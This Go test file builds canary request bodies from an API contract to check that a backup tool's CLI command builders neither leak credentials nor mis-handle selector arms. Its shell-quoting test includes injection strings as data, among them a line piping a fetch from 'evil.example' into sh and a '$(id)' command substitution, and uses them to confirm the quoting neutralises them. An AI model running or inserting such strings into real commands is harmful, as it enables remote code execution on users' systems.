package cliecho

import (
	"encoding/json"
	"fmt"
	"reflect"
	"slices"
	"sort"
	"strings"
	"testing"

	"github.com/retnd/retnd/core/apicontract"
)

// The corpus two tests in this package are driven with: one request body
// per contract schema, with EVERY string field on it, at every depth,
// carrying a value chosen by the caller.
//
// It is generated from apicontract.SchemaTypes rather than written out,
// and that is the whole point. A hand-written body carries the fields
// whoever wrote it was thinking about, which is exactly how a
// credential-leak test that named eight fields by hand stayed green while
// two real leaks (an endpoint URL's userinfo and a credentials command)
// walked past it: neither field was in the list, and nothing about the
// list said what it was missing. A schema added to the contract cannot go
// unvisited here, because the map this walks is the generator's own.

// canaryBody is one request body, plus the schema it was built from and
// which variant of it this is, so a failure says which shape produced it.
type canaryBody struct {
	schema string
	label  string
	body   []byte
}

// canaryBodies builds one body per contract schema, or one per variant
// where a field's value picks a code path (bodyVariants). value is given
// the field's path ("StorageMediumRequest.credentials.command[0]") and
// returns what that string field should carry.
//
// Numbers are filled with a small positive value and booleans with true,
// because a builder that only emits a flag when a number is positive or a
// flag is set would otherwise be walked with every one of those branches
// switched off, and a body that reaches no flag proves nothing about the
// flags. The other side of each boolean is the field check's job
// (fields_test.go flips every one).
func canaryBodies(t *testing.T, value func(path string) string) []canaryBody {
	t.Helper()
	names := make([]string, 0, len(apicontract.SchemaTypes))
	for name := range apicontract.SchemaTypes {
		names = append(names, name)
	}
	sort.Strings(names)

	out := make([]canaryBody, 0, len(names))
	for _, name := range names {
		typ := reflect.TypeOf(apicontract.SchemaTypes[name])
		if typ == nil || typ.Kind() != reflect.Struct {
			continue
		}
		filled := fillCanaries(typ, name, value, 0)
		body, err := json.Marshal(filled.Interface())
		if err != nil {
			t.Fatalf("marshalling a canary %s: %v", name, err)
		}
		variants, err := bodyVariants(name, body)
		if err != nil {
			t.Fatalf("building the variants of %s: %v", name, err)
		}
		for _, v := range variants {
			out = append(out, canaryBody{schema: name, label: v.label, body: v.body})
		}
	}
	if len(out) == 0 {
		t.Fatal("the contract offered no schemas at all, so every test driven from this corpus would pass having checked nothing")
	}
	return out
}

// labelledBody is one variant of a schema's canary body.
type labelledBody struct {
	label string
	body  []byte
}

// A selector is a field whose VALUE selects a code path, and it gets real
// values rather than a canary. A body whose selector is a canary string
// reaches no arm of the switch behind it, and a test driven only by such
// a body reports that no builder printed a canary, which is true and
// worthless.
//
// The values come from apicontract, never from a list kept here. This
// used to be a hand-written list of four of the seven operation actions:
// the three snapshot actions from #788 were never added, so neither this
// corpus nor the credential test driven from it had ever reached their
// arms, and `snapshot hold --reason` printed the operator's own sentence
// with nothing checking it was allowed to (#1253's review).
//
// Each selector also sends one value no arm knows, which is how a builder
// that falls through to a silent nil for a new action gets seen: the
// outcome golden pins what that value gets, and it has to be a refusal.
type selector struct {
	path   []string
	values []string
	// modes is, for a selector value, the request's own fields that go
	// with it. Every other key in modeKeys is removed from that variant,
	// because the contract refuses a body naming another value's
	// parameters, and a field from another mode showing up as "dropped"
	// is an artefact of the corpus rather than a decision.
	modes    map[string][]string
	modeKeys []string
}

// unknownSelector is the value no arm of any switch knows.
const unknownSelector = "not_a_value_the_contract_has"

var bodySelectors = map[string]selector{
	"SubmitOperationRequest": {
		path:   []string{"action"},
		values: apicontract.Actions,
		// The contract's own description: "restore_placement reads
		// restore, run_backup_set reads backup_set_id, ...". A new
		// action with no line here fails TestTheCorpusKnowsEveryAction.
		modes: map[string][]string{
			apicontract.ActionRunCycle:            {},
			apicontract.ActionRunBackupSet:        {"backup_set_id", "skip_workflow_scripts"},
			apicontract.ActionRestorePlacement:    {"restore"},
			apicontract.ActionRestoreSnapshot:     {"snapshot_restore"},
			apicontract.ActionVerifySnapshot:      {"snapshot_verify"},
			apicontract.ActionHoldSnapshot:        {"snapshot_hold"},
			apicontract.ActionReleaseSnapshotHold: {"snapshot_hold_release"},
		},
		modeKeys: []string{"backup_set_id", "skip_workflow_scripts", "restore", "snapshot_restore", "snapshot_verify", "snapshot_hold", "snapshot_hold_release"},
	},
	"RecoveryMintRequest": {path: []string{"target", "kind"}, values: apicontract.RecoveryTargetKinds},
	"RecoveryManyRequest": {path: []string{"target", "kind"}, values: apicontract.RecoveryTargetKinds},
}

// bodyModes are the schemas whose fields come in mutually exclusive
// groups that no single value selects. Each mode keeps its own keys and
// drops the rest of modeKeys, for the reason selector.modes does.
var bodyModes = map[string]struct {
	modes    map[string][]string
	modeKeys []string
}{
	// "Exactly one mode per request": a saved set by id, or a candidate's
	// connection details.
	"TestConnectionRequest": {
		modes: map[string][]string{
			"persisted": {"backup_set_id"},
			"candidate": {"host", "port", "user", "ssh_key_id", "known_hosts_line", "remote_path"},
		},
		modeKeys: []string{"backup_set_id", "host", "port", "user", "ssh_key_id", "known_hosts_line", "remote_path"},
	},
	// "Name exactly one of set and artifacts", and the narrowings go with
	// a set.
	"RecoveryManyRequest": {
		modes: map[string][]string{
			"set":       {"set", "newest_only", "since", "until", "all"},
			"artifacts": {"artifacts"},
		},
		modeKeys: []string{"set", "artifacts", "newest_only", "since", "until", "all"},
	},
}

// keepMode removes every key in modeKeys from object except keep.
func keepMode(object map[string]any, modeKeys, keep []string) {
	for _, k := range modeKeys {
		if !slices.Contains(keep, k) {
			delete(object, k)
		}
	}
}

func bodyVariants(schema string, body []byte) ([]labelledBody, error) {
	var decoded map[string]any
	if err := json.Unmarshal(body, &decoded); err != nil {
		return nil, err
	}
	variants := []struct {
		label string
		obj   map[string]any
	}{{"", decoded}}

	// Modes first, so a selector's variants are taken in every mode.
	if m, ok := bodyModes[schema]; ok {
		variants = variants[:0]
		for _, mode := range sortedKeys(m.modes) {
			obj := deepCopy(decoded).(map[string]any)
			keepMode(obj, m.modeKeys, m.modes[mode])
			variants = append(variants, struct {
				label string
				obj   map[string]any
			}{"mode=" + mode, obj})
		}
	}

	if sel, ok := bodySelectors[schema]; ok {
		var expanded []struct {
			label string
			obj   map[string]any
		}
		for _, v := range variants {
			for _, value := range append(slices.Clone(sel.values), unknownSelector) {
				obj := deepCopy(v.obj).(map[string]any)
				holder := obj
				for _, step := range sel.path[:len(sel.path)-1] {
					next, ok := holder[step].(map[string]any)
					if !ok {
						return nil, fmt.Errorf("%s has no object at %s", schema, step)
					}
					holder = next
				}
				holder[sel.path[len(sel.path)-1]] = value
				if sel.modes != nil {
					keepMode(obj, sel.modeKeys, sel.modes[value])
				}
				label := strings.Join(sel.path, ".") + "=" + value
				if value == unknownSelector {
					label = strings.Join(sel.path, ".") + "=<unknown>"
				}
				expanded = append(expanded, struct {
					label string
					obj   map[string]any
				}{strings.TrimPrefix(v.label+" "+label, " "), obj})
				// The same action with the parameters it reads left out,
				// which the engine refuses and a builder has to decline
				// by saying so (#1253's review).
				if sel.modes != nil && value != unknownSelector && len(sel.modes[value]) > 0 {
					bare := deepCopy(obj).(map[string]any)
					keepMode(bare, sel.modeKeys, nil)
					expanded = append(expanded, struct {
						label string
						obj   map[string]any
					}{strings.TrimPrefix(v.label+" "+label+" without its parameters", " "), bare})
				}
			}
		}
		variants = expanded
	}

	// The other branch a VALUE selects, and the reason it is here rather
	// than in a test's own table: a retention body carrying a tier chain
	// echoes --policy-file and nothing else, because the CLI refuses that
	// flag beside the scalars the chain's file already holds. Filling
	// every slice, which is what makes a canary reach a repeated field at
	// all, therefore switches the scalar branch off everywhere. A corpus
	// that only ever walks one side of a branch is a corpus that checks
	// half the builders.
	var out []labelledBody
	for _, v := range variants {
		encoded, err := json.Marshal(v.obj)
		if err != nil {
			return nil, err
		}
		without := deepCopy(v.obj)
		if !dropTiers(without) {
			out = append(out, labelledBody{v.label, encoded})
			continue
		}
		encodedWithout, err := json.Marshal(without)
		if err != nil {
			return nil, err
		}
		out = append(out,
			labelledBody{strings.TrimPrefix(v.label+" with tiers", " "), encoded},
			labelledBody{strings.TrimPrefix(v.label+" without tiers", " "), encodedWithout})
	}
	return out, nil
}

// deepCopy copies a decoded JSON value.
func deepCopy(v any) any {
	switch x := v.(type) {
	case map[string]any:
		out := make(map[string]any, len(x))
		for k, e := range x {
			out[k] = deepCopy(e)
		}
		return out
	case []any:
		out := make([]any, len(x))
		for i, e := range x {
			out[i] = deepCopy(e)
		}
		return out
	default:
		return v
	}
}

// TestTheCorpusKnowsEveryAction: the action vocabulary comes from
// apicontract, and which parameters each action reads has to be written
// down here, so a new action fails until somebody says which.
func TestTheCorpusKnowsEveryAction(t *testing.T) {
	sel := bodySelectors["SubmitOperationRequest"]
	for _, action := range apicontract.Actions {
		if _, ok := sel.modes[action]; !ok {
			t.Errorf("the corpus doesn't know which parameters %s reads, so its body would carry every other action's too. Add it to bodySelectors' modes.", action)
		}
	}
	for action := range sel.modes {
		if !slices.Contains(apicontract.Actions, action) {
			t.Errorf("bodySelectors names %s and apicontract.Actions doesn't", action)
		}
	}
}

// dropTiers removes every "tiers" key in a decoded body and reports
// whether it found one.
func dropTiers(node any) bool {
	object, ok := node.(map[string]any)
	if !ok {
		return false
	}
	found := false
	if _, ok := object["tiers"]; ok {
		delete(object, "tiers")
		found = true
	}
	for _, value := range object {
		if dropTiers(value) {
			found = true
		}
	}
	return found
}

// fillCanaries builds a value of typ with every string in it set by value.
//
// The depth bound is a guard rather than a rule about this contract: a
// schema that referred to itself would otherwise recurse forever, and a
// test that hangs is harder to read than one that stops.
func fillCanaries(typ reflect.Type, path string, value func(string) string, depth int) reflect.Value {
	v := reflect.New(typ).Elem()
	if depth > 6 {
		return v
	}
	switch typ.Kind() {
	case reflect.String:
		v.SetString(value(path))
	case reflect.Bool:
		v.SetBool(true)
	case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:
		v.SetInt(7)
	case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64:
		v.SetUint(7)
	case reflect.Float32, reflect.Float64:
		v.SetFloat(7)
	case reflect.Pointer:
		v.Set(reflect.New(typ.Elem()))
		v.Elem().Set(fillCanaries(typ.Elem(), path, value, depth+1))
	case reflect.Slice:
		elem := fillCanaries(typ.Elem(), path+"[0]", value, depth+1)
		v.Set(reflect.Append(reflect.MakeSlice(typ, 0, 1), elem))
	case reflect.Struct:
		for i := 0; i < typ.NumField(); i++ {
			field := typ.Field(i)
			if !field.IsExported() {
				continue
			}
			name := strings.Split(field.Tag.Get("json"), ",")[0]
			if name == "-" {
				continue
			}
			// An embedded struct with no name of its own is flattened on
			// the wire (CreateBackupSetRequest embeds BackupSetSpec), so
			// its fields' paths are the parent's, not "BackupSetSpec.x".
			if name == "" && field.Anonymous {
				v.Field(i).Set(fillCanaries(field.Type, path, value, depth+1))
				continue
			}
			if name == "" {
				name = field.Name
			}
			v.Field(i).Set(fillCanaries(field.Type, path+"."+name, value, depth+1))
		}
	}
	return v
}

// splitShell reads one rendered command line back into the words a shell
// would hand a process.
//
// It reads exactly the two things shellQuote emits, a bare word and a
// single-quoted string with a backslash-escaped quote standing in for an
// embedded one, and nothing else. That narrowness is deliberate: this is the reader that
// decides whether a rendered line means what the argv meant, so it has to
// be a reader of the shell's rules rather than a second copy of the
// writer's.
func splitShell(s string) []string {
	var (
		out    []string
		cur    strings.Builder
		inWord bool
		quoted bool
	)
	flush := func() {
		if inWord {
			out = append(out, cur.String())
			cur.Reset()
			inWord = false
		}
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case quoted:
			if c == '\'' {
				quoted = false
				continue
			}
			cur.WriteByte(c)
		case c == '\'':
			quoted, inWord = true, true
		case c == ' ' || c == '\t' || c == '\n':
			flush()
		case c == '\\':
			if i+1 < len(s) {
				i++
				cur.WriteByte(s[i])
				inWord = true
			}
		default:
			cur.WriteByte(c)
			inWord = true
		}
	}
	flush()
	return out
}

// TestSplitShellReadsWhatShellQuoteWrites is splitShell's own control.
// Every quoting assertion in this package is made through it, so a reader
// that quietly agreed with the writer would make all of them vacuous.
func TestSplitShellReadsWhatShellQuoteWrites(t *testing.T) {
	for _, arg := range []string{
		"plain",
		"",
		"with space",
		"a; curl http://evil.example/ | sh",
		"it's quoted",
		"<not a placeholder>",
		`back\slash`,
		"tab\there",
		"*.gz,*.sql",
		"$(id)",
		"10.0.0.14 ssh-ed25519 AAAAC3Nz",
	} {
		got := splitShell(shellQuote(arg))
		if len(got) != 1 || got[0] != arg {
			t.Errorf("shellQuote(%q) = %q, which reads back as %q rather than one word; every quoting claim in this package is made through this reader, so it has to be able to see a mistake", arg, shellQuote(arg), got)
		}
	}

	// And the reader is not simply returning what it was given: a line
	// that was NOT quoted comes back as several words.
	if got := splitShell("a; curl http://evil.example/ | sh"); len(got) < 2 {
		t.Fatalf("an unquoted line with spaces in it reads back as %q, so this reader could never tell quoted from unquoted", got)
	}
}
